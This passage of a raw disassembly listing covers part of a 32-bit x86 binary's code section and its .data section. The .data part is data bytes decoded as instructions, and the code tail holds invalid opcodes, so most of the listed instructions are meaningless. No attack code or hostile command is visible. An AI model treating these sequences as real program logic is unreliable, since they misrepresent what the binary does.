  411a63:	add    ecx,DWORD PTR [edx-0x5af5c7ce]
  411a69:	xor    al,0x6
  411a6b:	jmp    0x411a56
  411a6d:	jp     0x411a46
  411a6f:	and    al,0xaf
  411a71:	and    BYTE PTR [edi-0x842682b],bl
  411a77:	(bad)  
  411a79:	xchg   edx,eax
  411a7a:	adc    esp,DWORD PTR [ecx-0xd449b79]
  411a80:	test   BYTE PTR [edx-0x7a72c2d3],bl
  411a86:	pushf  
  411a87:	sbb    BYTE PTR [ecx+0x76e086c4],dl
  411a8d:	mov    al,0x64
  411a8f:	sti    
  411a90:	and    eax,esp
  411a92:	xor    eax,0x474b015d
  411a97:	mov    ds:0xfeb026da,eax
  411a9c:	adc    eax,0xde9c103
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
